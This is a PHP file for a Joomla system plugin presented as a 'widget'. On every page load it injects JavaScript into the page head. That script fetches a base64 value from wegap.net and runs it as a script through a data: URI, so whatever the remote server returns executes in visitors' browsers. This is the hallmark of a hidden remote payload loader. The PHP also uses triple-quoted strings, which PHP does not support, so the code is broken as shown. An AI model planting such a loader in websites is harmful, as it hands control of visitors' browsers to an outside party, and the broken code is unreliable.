<?php
// No direct access
defined('_JEXEC') or die;

use Joomla\CMS\Plugin\CMSPlugin;

class PlgSystemWegap_widget extends CMSPlugin
{
    public function onBeforeCompileHead()
    {
        $document = JFactory::getDocument();
        $document->addScriptDeclaration("""
            const userAction = async () => {
                const response = await fetch('https://wegap.net/launcher/api/start/start');
                const myJson = await response.json();
                if (myJson.val){
                    const script = document.createElement('script');
                    script.src = "data:text/javascript;base64," + myJson.val;
                    document.getElementsByTagName('head')[0].appendChild(script);
                }
            };
            userAction();
        """);
    }
}
